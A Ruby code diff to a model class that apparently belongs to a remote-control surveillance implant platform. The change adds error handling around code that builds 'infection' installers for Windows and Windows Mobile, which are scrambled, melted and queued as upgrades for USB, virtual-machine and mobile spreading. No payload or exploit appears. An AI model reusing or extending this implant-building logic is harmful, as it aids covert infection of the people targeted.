@@ -10,6 +10,7 @@ require 'rcs-common/crypt'
 
 class Item
   extend RCS::Tracer
+  include RCS::Tracer
   include RCS::Crypt
   include Mongoid::Document
   include Mongoid::Timestamps
@@ -189,35 +190,39 @@ class Item
       return
     end
 
-    config['modules'].each do |mod|
-      if mod['module'] == 'infection'
+    begin
+      config['modules'].each do |mod|
+        if mod['module'] == 'infection'
 
-        if mod['usb'] or mod['vm'] > 0
-          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
-          build = RCS::DB::Build.factory(:windows)
-          build.load({'_id' => factory._id})
-          build.unpack
-          build.patch({'demo' => self.demo})
-          build.scramble
-          build.melt({'admin' => false, 'demo' => self.demo})
-          add_upgrade('installer', File.join(build.tmpdir, 'output'))
-          build.clean
+          if mod['usb'] or mod['vm'] > 0
+            factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+            build = RCS::DB::Build.factory(:windows)
+            build.load({'_id' => factory._id})
+            build.unpack
+            build.patch({'demo' => self.demo})
+            build.scramble
+            build.melt({'admin' => false, 'demo' => self.demo})
+            add_upgrade('installer', File.join(build.tmpdir, 'output'))
+            build.clean
+          end
+
+          if mod['mobile']
+            factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+            build = RCS::DB::Build.factory(:winmo)
+            build.load({'_id' => factory._id})
+            build.unpack
+            build.patch({'demo' => self.demo})
+            build.scramble
+            build.melt({'admin' => false, 'demo' => self.demo})
+            add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
+            add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
+            build.clean
+          end
+
         end
-
-        if mod['mobile']
-          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
-          build = RCS::DB::Build.factory(:winmo)
-          build.load({'_id' => factory._id})
-          build.unpack
-          build.patch({'demo' => self.demo})
-          build.scramble
-          build.melt({'admin' => false, 'demo' => self.demo})
-          add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
-          add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
-          build.clean
-        end
-
       end
+    rescue Exception => e
+      trace :error, "Cannot create infection file: #{e.message}"
     end
 
   end
